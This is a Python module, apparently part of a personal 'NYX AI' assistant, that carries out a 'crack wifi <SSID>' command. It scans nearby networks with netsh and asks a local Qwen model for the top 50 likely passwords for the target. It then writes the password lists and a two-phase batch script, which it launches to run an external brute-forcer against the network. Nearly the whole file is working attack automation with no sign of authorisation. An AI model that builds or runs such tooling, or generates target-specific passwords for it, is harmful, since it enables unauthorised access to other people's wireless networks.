import subprocess
import os
import time
from pathlib import Path
from ..nyx.model_client import get_model_client

def ask_qwen_simple(prompt):
    """Get a response from the local Qwen model."""
    client_info = get_model_client()
    client = client_info["client"]
    model = client_info["model"]

    try:
        response = client.chat.completions.create(
            model=model,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1
        )
        return response.choices[0].message.content
    except Exception as e:
        print(f"Error querying NYX AI: {e}")
        return None

def perform_wifi_scan():
    """Perform WiFi scan to get available networks using netsh command."""
    print("[NYX AI] Scanning for WiFi networks...")
    
    try:
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0:
            return result.stdout
        else:
            print(f"Scan failed: {result.stderr}")
            return None
            
    except Exception as e:
        print(f"Error during WiFi scan: {e}")
        return None

def extract_network_info(scan_output, target_ssid):
    """Extract information about the target network from scan results."""
    if not scan_output:
        return None
        
    lines = scan_output.split('\n')
    network_info = {}
    current_ssid = None
    
    for line in lines:
        line = line.strip()
        if line.startswith('SSID'):
            parts = line.split(':', 1)
            if len(parts) > 1:
                current_ssid = parts[1].strip()
                if current_ssid == target_ssid:
                    network_info['ssid'] = current_ssid
        elif current_ssid == target_ssid:
            if line.startswith('Signal'):
                parts = line.split(':', 1)
                if len(parts) > 1:
                    network_info['signal'] = parts[1].strip()
            elif line.startswith('Authentication'):
                parts = line.split(':', 1)
                if len(parts) > 1:
                    network_info['auth'] = parts[1].strip()
            elif line.startswith('Encryption'):
                parts = line.split(':', 1)
                if len(parts) > 1:
                    network_info['encryption'] = parts[1].strip()
    
    return network_info if network_info else None

def generate_ai_passwords(ssid, network_info):
    """Generate AI-optimized passwords and save to rockyou.txt"""
    bruteforcer_dir = Path(r"C:\Users\User\OneDrive\Desktop\hacking folder. Caution !\bruteforcer\BF_Files")
    rockyou_path = bruteforcer_dir / "rockyou.txt"
    
    # Prepare AI prompt with network context
    network_context = f"Network: {ssid}"
    if network_info:
        network_context += f", Auth: {network_info.get('auth', 'Unknown')}, Signal: {network_info.get('signal', 'Unknown')}"
    
    analysis_prompt = f"""
    TASK: Generate optimized WiFi passwords for bruteforce attack.
    TARGET: {network_context}

    Create the most likely passwords for this specific WiFi network. 
    Consider common naming schemes, patterns, and human behavior.

    Return ONLY a list of the top 50 most likely passwords, one per line. 
    No other text or explanation.
    """

    print(f"[NYX AI] Generating optimized passwords for '{ssid}'...")
    ai_response = ask_qwen_simple(analysis_prompt)

    if not ai_response:
        print("[NYX AI] Using fallback password generation")
        ai_response = f"""
        password
        12345678
        qwertyui
        1234567890
        admin
        welcome
        internet
        letmein
        password123
        {ssid.lower().replace(' ', '')}
        {ssid.lower().replace(' ', '')}123
        {ssid.lower().replace(' ', '')}1234
        {ssid.lower().replace(' ', '')}2024
        {ssid.lower().replace(' ', '')}2023
        securewifi
        wirelessnetwork
        """

    # Parse AI response
    optimized_list = []
    for line in ai_response.split('\n'):
        line = line.strip()
        if line and len(line) >= 8:  # Only include passwords with at least 8 characters
            optimized_list.append(line)

    # Add network-specific passwords
    if network_info:
        additional_passwords = []
        if 'WPA2' in network_info.get('auth', ''):
            additional_passwords.extend(['wpa2password', 'wpa2key', 'securewpa2'])
        if 'WPA' in network_info.get('auth', ''):
            additional_passwords.extend(['wpakey', 'wpapassword'])
        optimized_list.extend(additional_passwords)
    
    # Add essential fallbacks
    fallbacks = [
        "password", "12345678", "qwertyui", "1234567890", "admin", "welcome",
        "internet", "letmein", "password123", "securewifi", "wireless",
        ssid.lower().replace(" ", ""), ssid.lower().replace(" ", "") + "123",
        ssid.lower().replace(" ", "") + "1234", ssid.lower().replace(" ", "") + "2024"
    ]
    
    for fb in fallbacks:
        if fb not in optimized_list and len(fb) >= 8:
            optimized_list.append(fb)

    # Remove duplicates and limit to 50 passwords
    optimized_list = list(dict.fromkeys(optimized_list))[:50]

    # Write AI-generated passwords to rockyou.txt
    try:
        with open(rockyou_path, 'w', encoding='utf-8') as f:
            for password in optimized_list:
                f.write(password + "\n")
        print(f"[NYX AI] Generated {len(optimized_list)} optimized passwords in rockyou.txt")
        return True
    except Exception as e:
        print(f"[NYX AI] Error writing to rockyou.txt: {e}")
        return False

def create_phase_detection_system():
    """Create a system to detect when Phase 1 completes and Phase 2 should start"""
    bruteforcer_dir = Path(r"C:\Users\User\OneDrive\Desktop\hacking folder. Caution !\bruteforcer\BF_Files")
    
    # Create a batch script that handles the two-phase logic
    phase_script = bruteforcer_dir / "nyx_phase_system.bat"
    
    script_content = """
@echo off
setlocal enabledelayedexpansion

echo [NYX AI] Starting Two-Phase Attack System
echo.

:PHASE_1
echo ===== PHASE 1: Constant Passwords =====
echo Using pre-defined passwords from passlist.txt
echo.

:: Run Phase 1 attack
call bruteforce.bat attack

:: Check if Phase 1 was successful by looking for success indicator
:: This assumes your bruteforce.bat creates a file or sets a variable on success
if exist success.txt (
    echo [SUCCESS] Password found in Phase 1!
    goto END
)

echo.
echo [PHASE 1 COMPLETED] No password found in constant passwords
echo.

:PHASE_2
echo ===== PHASE 2: AI-Optimized Passwords =====
echo Loading NYX AI-generated passwords from rockyou.txt
echo.

:: Replace passlist.txt with AI-optimized passwords
if exist rockyou.txt (
    copy rockyou.txt passlist.txt >nul
    echo Loaded AI-optimized passwords into passlist.txt
) else (
    echo Error: rockyou.txt not found!
    goto END
)

:: Run Phase 2 attack
call bruteforce.bat attack

:: Check if Phase 2 was successful
if exist success.txt (
    echo [SUCCESS] Password found in Phase 2!
) else (
    echo [FAILURE] Password not found in either phase
)

:END
echo.
echo [NYX AI] Two-phase attack completed
del success.txt 2>nul
pause
"""
    
    try:
        with open(phase_script, 'w') as f:
            f.write(script_content)
        print("[NYX AI] Created two-phase detection system")
        return phase_script
    except Exception as e:
        print(f"[NYX AI] Error creating phase system: {e}")
        return None

def setup_attack_environment(ssid):
    """Set up the complete attack environment"""
    bruteforcer_dir = Path(r"C:\Users\User\OneDrive\Desktop\hacking folder. Caution !\bruteforcer\BF_Files")
    
    # 1. Ensure passlist.txt has constant passwords (PHASE 1)
    passlist_path = bruteforcer_dir / "passlist.txt"
    constant_passwords = [
        "password", "12345678", "123456789", "1234567890",
        "qwertyui", "admin", "welcome", "internet", "letmein",
        "password123", "securewifi", "wireless", "default",
        "changeme", "1234", "00000000", "11111111", "abcdefgh"
    ]
    
    try:
        with open(passlist_path, 'w', encoding='utf-8') as f:
            for password in constant_passwords:
                f.write(password + "\n")
        print("[NYX AI] Constant passwords loaded into passlist.txt (Phase 1)")
    except Exception as e:
        return f"Error setting up passlist.txt: {e}"

    # 2. Generate AI passwords for rockyou.txt (PHASE 2)
    scan_output = perform_wifi_scan()
    network_info = extract_network_info(scan_output, ssid) if scan_output else None
    
    if not generate_ai_passwords(ssid, network_info):
        return "Failed to generate AI-optimized passwords for Phase 2"

    # 3. Create phase detection system
    phase_script = create_phase_detection_system()
    if not phase_script:
        return "Failed to create phase detection system"

    return phase_script

def crack_wifi_password(ssid: str):
    """
    NYX AI-powered WiFi cracking with proper two-phase approach
    """
    bruteforcer_dir = Path(r"C:\Users\User\OneDrive\Desktop\hacking folder. Caution !\bruteforcer\BF_Files")
    
    # 1. Set up the complete attack environment
    print(f"[NYX AI] Preparing two-phase attack for '{ssid}'...")
    result = setup_attack_environment(ssid)
    
    if isinstance(result, str) and "Error" in result:
        return result
    
    # 2. Launch the two-phase attack system
    phase_script = result
    try:
        os.chdir(bruteforcer_dir)
        
        # Set target WiFi for the bruteforcer
        target_file = bruteforcer_dir / "target_wifi.txt"
        with open(target_file, 'w') as f:
            f.write(ssid)
        
        # Clean up any previous success files
        success_file = bruteforcer_dir / "success.txt"
        if success_file.exists():
            success_file.unlink()
        
        print("[NYX AI] Launching two-phase automated attack...")
        subprocess.Popen(f'start cmd /k "{phase_script.name}"', shell=True)
        
        message = f"""
[NYX AI] Two-phase attack system launched for '{ssid}'

PHASE 1: Constant Passwords
- Using fixed set of common passwords from passlist.txt
- Fast initial attempt with most likely passwords

PHASE 2: AI-Optimized Passwords (only if Phase 1 fails)
- Using NYX AI-generated intelligent passwords from rockyou.txt
- Passwords specifically tailored for '{ssid}'

The system will automatically:
1. Try all constant passwords first
2. Only if no success, switch to AI passwords
3. Report results automatically

Attack is now running in the new command window...
"""
        return message
        
    except Exception as e:
        return f"Error launching attack system: {e}"

def handle_crack_wifi(params):
    """Handler for the 'crack wifi' command."""
    if not params:
        return "Please specify: 'crack wifi [Network Name]'"

    parts = params.split()
    if len(parts) < 3:
        return "Invalid format. Use: 'crack wifi <Network Name>'"
    
    ssid = " ".join(parts[2:])
    return crack_wifi_password(ssid)